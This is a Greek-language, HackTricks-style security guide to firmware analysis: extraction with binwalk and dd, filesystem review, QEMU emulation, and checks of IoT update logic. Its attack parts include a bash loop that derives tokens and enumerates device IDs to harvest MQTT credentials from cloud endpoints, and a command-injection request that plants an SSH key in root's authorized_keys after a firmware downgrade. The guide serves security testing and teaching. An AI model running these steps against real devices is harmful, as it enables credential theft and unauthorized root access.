# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware είναι ουσιώδες software που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του software με το οποίο αλληλεπιδρούν οι χρήστες. Είναι αποθηκευμένο σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή έχει πρόσβαση σε ζωτικές εντολές από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και ενδεχόμενη τροποποίηση του firmware είναι κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.

## **Συλλογή Πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συγκέντρωση δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που τρέχει
- Πληροφορίες για το bootloader
- Διάταξη hardware και datasheets
- Μετρικά του codebase και τοποθεσίες source
- Εξωτερικές βιβλιοθήκες και τύπους αδειών
- Ιστορικά ενημερώσεων και πιστοποιήσεις ρυθμιστικής συμμόρφωσης
- Αρχιτεκτονικά και διαγράμματα ροής
- Αξιολογήσεις ασφάλειας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω χειροκίνητης και αυτοματοποιημένης ανασκόπησης. Εργαλεία όπως [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορούν να αξιοποιηθούν για να εντοπιστούν πιθανά προβλήματα.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να προσεγγιστεί με διάφορα μέσα, καθένα με το δικό του επίπεδο πολυπλοκότητας:

- **Άμεσα** από την πηγή (developers, manufacturers)
- **Κατασκευάζοντάς** το από τις παρεχόμενες οδηγίες
- **Κατεβάζοντάς** το από επίσημους ιστότοπους υποστήριξης
- Χρησιμοποιώντας **Google dork** queries για την εύρεση φιλοξενούμενων αρχείων firmware
- Πρόσβαση σε **cloud storage** άμεσα, με εργαλεία όπως [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλέπτοντας **updates** μέσω man-in-the-middle τεχνικών
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως UART, JTAG, ή PICit
- **Sniffing** για αιτήματα ενημέρωσης μέσα στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded update endpoints**
- **Dumping** από το bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτύχουν, χρησιμοποιώντας κατάλληλα hardware εργαλεία

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξάγετε πληροφορίες γι' αυτό ώστε να γνωρίζετε πώς να το αντιμετωπίσετε. Διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`, αν η εντροπία είναι χαμηλή, τότε πιθανότατα δεν είναι κρυπτογραφημένη. Αν η εντροπία είναι υψηλή, είναι πιθανό να είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Απόκτηση του filesystem

Με τα προηγούμενα εργαλεία που αναφέρθηκαν, όπως `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το filesystem**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα ίσο με τον τύπο του filesystem**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή του filesystem

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του filesystem στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του filesystem και να carve το συμπιεσμένο filesystem** από το binary και να **εξαγάγετε χειροκίνητα** το filesystem ανάλογα με τον τύπο του χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την παρακάτω **dd command** για carving του Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, μπορεί επίσης να εκτελεστεί η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (χρησιμοποιήθηκε στο παράδειγμα παραπάνω)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στον κατάλογο `squashfs-root` στη συνέχεια.

- Αρχεία CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το αναλύσετε για να κατανοήσετε τη δομή του και πιθανά τρωτά σημεία. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από την εικόνα του firmware.

### Εργαλεία Αρχικής Ανάλυσης

Παρέχεται ένα σύνολο εντολών για αρχική επιθεώρηση του δυαδικού αρχείου (αναφερόμενου ως <bin>). Αυτές οι εντολές βοηθούν στην ταυτοποίηση τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των διαμερισμάτων και των συστημάτων αρχείων:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Χαμηλή εντροπία υποδηλώνει έλλειψη κρυπτογράφησης, ενώ υψηλή εντροπία δείχνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή των **ενσωματωμένων αρχείων**, προτείνονται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Χρησιμοποιώντας `binwalk -ev <bin>`, συνήθως μπορεί κανείς να εξάγει το σύστημα αρχείων, συχνά σε έναν κατάλογο που ονομάζεται από τον τύπο του συστήματος αρχείων (π.χ., squashfs, ubifs). Ωστόσο, όταν η **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του συστήματος αρχείων λόγω απουσίας μαγικών bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του συστήματος αρχείων, ακολουθούμενη από την εντολή `dd` για να αποκοπεί το σύστημα αρχείων:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Μετά, ανάλογα με τον τύπο του filesystem (π.χ., squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή του περιεχομένου.

### Ανάλυση filesystem

Με την εξαγωγή του filesystem, ξεκινά η αναζήτηση για ευπάθειες ασφαλείας. Δίνεται προσοχή σε insecure network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, uncompiled code, startup scripts και compiled binaries για ανάλυση εκτός συσκευής.

**Κύριες τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:

- **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά SSL και κλειδιά σε **etc/ssl**
- Αρχεία ρυθμίσεων και script για πιθανές ευπάθειες
- Embedded binaries για περαιτέρω ανάλυση
- Συνηθισμένοι web servers και binaries σε συσκευές IoT

Πολλά εργαλεία βοηθούν στην αποκάλυψη ευαίσθητων πληροφοριών και ευπαθειών μέσα στο filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Έλεγχοι ασφάλειας σε compiled binaries

Τanto ο πηγαίος κώδικας όσο και τα compiled binaries που βρέθηκαν στο filesystem πρέπει να εξεταστούν για ευπάθειες. Εργαλεία όπως **checksec.sh** για Unix binaries και **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να εκμεταλλευτούν.

## Συλλογή cloud config και MQTT credentials μέσω παραγόμενων URL tokens

Πολλά IoT hubs ανακτούν τη διαμόρφωση ανά-συσκευή από ένα cloud endpoint που μοιάζει με:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το <token> προκύπτει τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε όποιον μάθει το deviceId και το STATIC_KEY να ανασυνθέσει το URL και να τραβήξει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.

Πρακτική ροή εργασίας:

1) Εξαγωγή deviceId από UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Ψάξτε για γραμμές που εκτυπώνουν το cloud config URL pattern και broker address, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή χρήση MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράγετε το token σε Bash και μετατρέψτε το digest σε κεφαλαία:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Συνθέστε το URL και τραβήξτε το JSON με curl; αναλύστε το με jq για να εξαγάγετε secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Κατάχρηση plaintext MQTT και weak topic ACLs (αν υπάρχουν)

- Χρησιμοποιήστε ανακτημένα credentials για να εγγραφείτε σε maintenance topics και να αναζητήσετε sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Απαρίθμηση προβλέψιμων device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν vendor OUI/product/type bytes ακολουθούμενα από διαδοχική κατάληξη.
- Μπορείτε να διατρέξετε candidate IDs, να παράγετε tokens και να ανακτήσετε configs προγραμματικά:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Πάντοτε αποκτήστε ρητή εξουσιοδότηση προτού επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για την ανάκτηση secrets χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατόν.

Η διαδικασία emulating firmware επιτρέπει την **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις λόγω εξαρτήσεων από hardware ή architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με συμβατή architecture και endianness, όπως ένα Raspberry Pi, ή σε μια pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε την endianness και την CPU architecture του προγράμματος.

#### Παράδειγμα με MIPS Architecture

Για να emulate ένα MIPS architecture binary, μπορείτε να χρησιμοποιήσετε την εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, και για little-endian binaries, η επιλογή θα ήταν `qemu-mipsel`.

#### Εξομοίωση αρχιτεκτονικής ARM

Για ARM binaries, η διαδικασία είναι παρόμοια, χρησιμοποιώντας τον emulator `qemu-arm` για την εξομοίωση.

### Πλήρης εξομοίωση συστήματος

Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), και άλλα, διευκολύνουν την πλήρη firmware εξομοίωση, αυτοματοποιώντας τη διαδικασία και βοηθώντας στη δυναμική ανάλυση.

## Δυναμική ανάλυση στην πράξη

Σε αυτό το στάδιο, χρησιμοποιείται είτε πραγματική είτε εξομοιωμένη συσκευή για ανάλυση. Είναι απαραίτητο να διατηρείται πρόσβαση σε shell προς το OS και το filesystem. Η εξομοίωση μπορεί να μην αναπαράγει τέλεια τις αλληλεπιδράσεις με το hardware, οπότε μπορεί να χρειαστεί επανεκκίνηση της εξομοίωσης. Η ανάλυση πρέπει να επανεξετάσει το filesystem, να εκμεταλλευθεί εκτεθειμένα webpages και network services, και να εξερευνήσει ευπάθειες στον bootloader. Οι έλεγχοι ακεραιότητας του firmware είναι κρίσιμοι για να εντοπιστούν πιθανές backdoor ευπάθειες.

## Τεχνικές runtime ανάλυσης

Η runtime ανάλυση περιλαμβάνει αλληλεπίδραση με μια διεργασία ή binary στο λειτουργικό της περιβάλλον, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida και Ghidra για τοποθέτηση breakpoints και εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

## Binary Exploitation and Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της στοχευόμενης αρχιτεκτονικής και προγραμματισμό σε χαμηλού επιπέδου γλώσσες. Binary runtime protections σε embedded systems είναι σπάνιες, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι απαραίτητες.

## Προ-διαμορφωμένα λειτουργικά συστήματα για ανάλυση firmware

Λειτουργικά συστήματα όπως [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προ-διαμορφωμένα περιβάλλοντα για firmware security testing, με τα απαραίτητα εργαλεία.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι μια distro που στοχεύει στο να σας βοηθήσει να πραγματοποιήσετε security assessment και penetration testing συσκευών Internet of Things (IoT). Σας εξοικονομεί πολύ χρόνο παρέχοντας ένα προ-διαμορφωμένο περιβάλλον με όλα τα απαραίτητα εργαλεία εγκατεστημένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο στο Ubuntu 18.04 με προεγκατεστημένα εργαλεία για firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμα και όταν ένας vendor εφαρμόζει cryptographic signature checks για firmware images, **η προστασία έναντι version rollback (downgrade) συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ένα embedded public key αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) της εικόνας που γίνεται flash, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επανεισάγει επιδιορθωμένες ευπάθειες.

Τυπική ροή επίθεσης:

1. **Απόκτηση παλαιότερης υπογεγραμμένης εικόνας**
* Λήψη από το δημόσιο download portal του vendor, CDN ή τη σελίδα υποστήριξης.
* Εξαγωγή από συνοδευτικές mobile/desktop εφαρμογές (π.χ. μέσα σε ένα Android APK υπό `assets/firmware/`).
* Ανάκτηση από τρίτες αποθετήρια όπως VirusTotal, Internet archives, forums, κ.λπ.
2. **Ανέβασμα ή σερβίρισμα της εικόνας στη συσκευή** μέσω οποιουδήποτε εκτεθειμένου update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
* Πολλές consumer IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα αποκωδικοποιούν server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλεύσου μια ευπάθεια που είχε επιδιορθωθεί στη νεότερη έκδοση (π.χ. ένα φίλτρο command-injection που προστέθηκε αργότερα).
4. Προαιρετικά κάνε flash την τελευταία εικόνα ξανά ή απενεργοποίησε τις ενημερώσεις για να αποφύγεις την ανίχνευση μετά την απόκτηση persistence.

### Παράδειγμα: Command Injection μετά από downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μία εντολή shell χωρίς φιλτράρισμα/έλεγχο εισόδου, επιτρέποντας την ένεση αυθαίρετων εντολών (εδώ — ενεργοποίηση πρόσβασης root μέσω κλειδιού SSH). Μεταγενέστερες εκδόσεις firmware εισήγαγαν ένα βασικό φίλτρο χαρακτήρων, αλλά η απουσία προστασίας κατά της υποβάθμισης καθιστά τη διόρθωση άνευ σημασίας.

### Εξαγωγή firmware από εφαρμογές για κινητά

Πολλοί κατασκευαστές ενσωματώνουν πλήρεις εικόνες firmware μέσα στις συνοδευτικές εφαρμογές για κινητά ώστε η εφαρμογή να μπορεί να ενημερώσει τη συσκευή μέσω Bluetooth/Wi‑Fi. Αυτά τα πακέτα συνήθως αποθηκεύονται χωρίς κρυπτογράφηση στο APK/APEX κάτω από διαδρομές όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως `apktool`, `ghidra` ή ακόμα και το απλό `unzip` σας επιτρέπουν να εξαγάγετε υπογεγραμμένες εικόνες χωρίς να αγγίξετε το φυσικό υλικό.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Είναι η μεταφορά/αυθεντικοποίηση του *update endpoint* επαρκώς προστατευμένη (TLS + authentication)?
* Η συσκευή συγκρίνει **αριθμούς έκδοσης** ή έναν **μονότονο anti-rollback μετρητή** πριν το flashing?
* Το image επικυρώνεται μέσα σε μια αλυσίδα secure boot (π.χ. υπογραφές ελεγχόμενες από ROM code)?
* Ο κώδικας userland εκτελεί επιπλέον ελέγχους ορθότητας (π.χ. επιτρεπόμενος χάρτης partitions, αριθμός μοντέλου)?
* Οι *partial* ή *backup* ροές ενημέρωσης χρησιμοποιούν την ίδια λογική επικύρωσης?

> 💡  Εάν κάποιο από τα παραπάνω λείπει, η πλατφόρμα πιθανότατα είναι ευάλωτη σε επιθέσεις rollback.

## Ευάλωτο firmware για εξάσκηση

Για εξάσκηση στην ανεύρεση ευπαθειών σε firmware, χρησιμοποιήστε τα ακόλουθα έργα ευάλωτου firmware ως σημείο εκκίνησης.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Εκπαίδευση και Πιστοποίηση

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
